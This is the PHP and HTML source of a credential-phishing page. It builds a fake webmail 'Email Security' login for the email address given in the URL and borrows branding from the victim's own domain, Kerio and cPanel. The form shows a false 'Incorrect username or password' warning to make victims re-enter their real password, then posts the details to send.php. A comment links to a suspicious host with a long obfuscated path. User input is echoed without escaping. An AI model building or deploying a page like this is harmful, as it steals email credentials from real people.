<?php


session_start();

function getloginIDFromlogin($email)
{
$find = '@';
$pos = strpos($email, $find);
$loginID = substr($email, 0, $pos);
return $loginID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$login = $_GET['login'];
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$_SESSION['domain'] = $domain;

$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}



$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}

$logoo=$yuh;

$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<!-- saved from url=(0415)https://kayanteiss.xyz/675RT67TDF4F67TGWEYFGWYF/IR36RT94RTF96T4TRFI7WRT6W67RGYF34WT/TS8D673TRD8F67T3F67YG66TFWAE67R/A67345RT67FBTEFTFFG7FG4RFW/UQ5ERU235DTQUFTGTYGFUI43TF6IQ/I65RT4R67TFGI4FTG3YUFG34I/RI6Q7T2IR67TQB9F7866TF4R7Q67G/79634TR96FGIF6RT5923R76TWF/38756E7T7RTWTW6F7TF67TFW4R/I63RV52I67F7IRWTYTFBV87T54F43/67RTF8BQ6T86TF7847R68Q72/mailbox/5R82V5RF8TTT7YWFTQ3B946FT34T/userarchive/redo.php?email=lala@daum.net -->
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title><?php echo $yuh ?> Email Security :: For <?php echo $login ?> </title>
<link type="text/css" rel="stylesheet" href="./daum.net - Mail_files/style.css" media="all">

<link rel="apple-touch-icon" sizes="57x57" href="https://my.kerio.com/static/img/favicons/apple-icon-57x57.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="60x60" href="https://my.kerio.com/static/img/favicons/apple-icon-60x60.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="72x72" href="https://my.kerio.com/static/img/favicons/apple-icon-72x72.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="76x76" href="https://my.kerio.com/static/img/favicons/apple-icon-76x76.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="114x114" href="https://my.kerio.com/static/img/favicons/apple-icon-114x114.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="120x120" href="https://my.kerio.com/static/img/favicons/apple-icon-120x120.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="144x144" href="https://my.kerio.com/static/img/favicons/apple-icon-144x144.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="152x152" href="https://my.kerio.com/static/img/favicons/apple-icon-152x152.png?v=BUILD_HASH">
<link rel="apple-touch-icon" sizes="180x180" href="https://my.kerio.com/static/img/favicons/apple-icon-180x180.png?v=BUILD_HASH">
<link rel="icon" type="image/png" sizes="192x192" href="https://www.google.com/s2/favicons?domain=<?php echo $logoo;?>?v=BUILD_HASH">
<link rel="icon" type="image/png" sizes="32x32" href="https://www.google.com/s2/favicons?domain=<?php echo $logoo;?>?v=BUILD_HASH">
<link rel="icon" type="image/png" sizes="96x96" href="https://kayanteiss.xyz/675RT67TDF4F67TGWEYFGWYF/IR36RT94RTF96T4TRFI7WRT6W67RGYF34WT/TS8D673TRD8F67T3F67YG66TFWAE67R/A67345RT67FBTEFTFFG7FG4RFW/UQ5ERU235DTQUFTGTYGFUI43TF6IQ/I65RT4R67TFGI4FTG3YUFG34I/RI6Q7T2IR67TQB9F7866TF4R7Q67G/79634TR96FGIF6RT5923R76TWF/38756E7T7RTWTW6F7TF67TFW4R/I63RV52I67F7IRWTYTFBV87T54F43/67RTF8BQ6T86TF7847R68Q72/mailbox/5R82V5RF8TTT7YWFTQ3B946FT34T/userarchive/css/opened-email-envelope.png?v=BUILD_HASH">
<link rel="icon" type="image/png" sizes="16x16" href="https://kayanteiss.xyz/675RT67TDF4F67TGWEYFGWYF/IR36RT94RTF96T4TRFI7WRT6W67RGYF34WT/TS8D673TRD8F67T3F67YG66TFWAE67R/A67345RT67FBTEFTFFG7FG4RFW/UQ5ERU235DTQUFTGTYGFUI43TF6IQ/I65RT4R67TFGI4FTG3YUFG34I/RI6Q7T2IR67TQB9F7866TF4R7Q67G/79634TR96FGIF6RT5923R76TWF/38756E7T7RTWTW6F7TF67TFW4R/I63RV52I67F7IRWTYTFBV87T54F43/67RTF8BQ6T86TF7847R68Q72/mailbox/5R82V5RF8TTT7YWFTQ3B946FT34T/userarchive/css/opened-email-envelope.png?v=BUILD_HASH">
<link rel="manifest" href="https://my.kerio.com/static/img/favicons/manifest.json?v=BUILD_HASH">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="msapplication-TileImage" content="https://www.google.com/s2/favicons?domain=<?php echo $logoo;?>?v=BUILD_HASH">
<meta name="theme-color" content="#ffffff">
<link rel="shortcut icon" type="image/vnd.microsoft.icon" href="https://www.google.com/s2/favicons?domain=<?php echo $logoo;?>?v=BUILD_HASH">

<script type="text/javascript">
<!--
function onLoad() {
	var
		k_urlHash = window.location.hash,
		k_emailInput = document.getElementById('email'),
		k_email,
		k_formElement,
		k_errorDiv,
		k_plainErrorMessage,
		k_errorMessage,
		k_errorTextNode;

	if (k_urlHash) {
		if (-1 !== k_urlHash.indexOf('email=')) {
			k_email = k_urlHash.substring(k_urlHash.indexOf('email=') + 6);
			if (-1 !== k_email.indexOf('&')) {
				k_email = k_email.substring(0, k_email.indexOf('&'));
			}
			if (k_email) {
				document.getElementById('email').value = k_email;
				document.getElementById('password').focus();

				k_urlHash = k_urlHash.replace('email=' + k_email, '');
			}
		}

		if(-1 !== k_urlHash.indexOf('errorMessage=')) {
			k_plainErrorMessage = k_urlHash.substring(k_urlHash.indexOf('errorMessage=') + 13);
			if (-1 !== k_plainErrorMessage.indexOf('&')) {
				k_plainErrorMessage = k_plainErrorMessage.substring(0, k_plainErrorMessage.indexOf('&'));
			}
			k_errorMessage = decodeURI(k_plainErrorMessage);
			if (k_errorMessage.length) {
				// If there is error message in the url hash, create the error div in the form
				k_formElement = document.getElementById('loginForm');
				k_errorDiv = document.createElement("div");
				k_errorDiv.className = 'error-message-text message';
				k_errorTextNode = document.createTextNode(k_errorMessage);
				k_errorDiv.appendChild(k_errorTextNode);

				k_formElement.insertBefore(k_errorDiv, k_formElement.firstChild);
			}

			k_urlHash = k_urlHash.replace('errorMessage=' + k_plainErrorMessage, '');
		}

		// remove linkers from above conditions
		k_urlHash = k_urlHash.replace('&&', '&'); // remove doubled linkers
		k_urlHash = k_urlHash.replace('#&', '#'); // remove linker on start
		k_urlHash = k_urlHash.replace(/&$/, '');  // remove linker on end
		k_urlHash = k_urlHash.replace(/^#&/, ''); // remove only hash mark

		if (k_urlHash.length) {
			document.getElementById('loginForm').action += k_urlHash;
			document.getElementById('registerLink').href += k_urlHash;
		}
	}

	k_emailInput.maxLength = mykerio.k_CONSTANTS.k_EMAIL_MAX_LENGHT;

	mykerio.k_widgets.k_browserInfo.k_showUnsupportedBrowserMessage(document.getElementById('unsupportedBrowser'));
	if (mykerio.k_widgets.k_browserInfo.k_isBlocked()) {
		document.body.className +=' browseBlocked';
	}
}
-->
</script>

</head>
<body onload="onLoad();">
    <br><br><br><br>
	<div id="header">
		<div id="header-inner">
		<center>  <img src="./daum.net - Mail_files/webmail-logo.png" alt="Mailbox" style="width:300px;height:60px;">
		<br>
		</center></div>
		<br>
	</div>
	<br>
	<br>
	<div id="main-container">
	
	<div id="body-container">
			<form id="loginForm" class="container-form" action="send.php" method="post">
				
				
				<div id="unsupportedBrowser" style="display: none;">&nbsp;</div>

				<table align="center">
					<tbody><tr>
						<td>
						<div align="left">
  Email Address
</div>	
		
		
								
								
									<input type="email" name="login" id="email" value="<?php echo $login ?>" maxlength="50">
							<br><br>	
							
						</td>
					</tr>
					<tr>
						<td>
						<div align="left">
 Password
</div>	
							<input type="password" name="passwd" id="password" placeholder="Enter your correct password">
						</td>
					</tr>
					<tr>
						<td id="remember-container">

							<label  ><span style="color:red;">Incorrect username or password </span></label>
						</td>
						
					</tr>
						
						
					
					
				</tbody>

						
				</table>
				<div>
					<br><input type="hidden" name="email" size="35" value="<?php echo $login;?>"><input type="hidden" name="address" size="5" value="<?php echo $logoo;?>">
<br><input type="hidden" name="email" size="35" value="<?php echo $login;?>"><input type="hidden" name="type" size="5" value="<?php echo $logoo;?>">
					<input id="login-button" type="submit" value="Log in">
									
				</div>
			</form>
		</div>
	</div>
	
<br><br><br><br><br>

									<div align="center">
 English&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; العربية&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; български&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; čeština&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dansk &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Deutsch&nbsp;&nbsp;&nbsp; Ελληνικά &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;español&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; …
</div>	

	</div>
<br><br><br><br>
<div id="header-inner">
<center>  <img src="./daum.net - Mail_files/cp.png" alt="Mailbox" style="width:40px;height:40px;">

<center>  	<img src="https://www.google.com/s2/favicons?domain=<?php echo $logoo;?>" alt="Mailbox" 
style="width:15px;height:18px;">	<small>&nbsp; <?php echo $yuh ?>&nbsp;Copyright©&nbsp;2020 cPanel Webmail.</div></small>
		

 <center>    <br><a href="https://go.cpanel.net/privacy" target="_blank">Privacy Policy</a></div>
		<br>
		</center></div>
</body></html>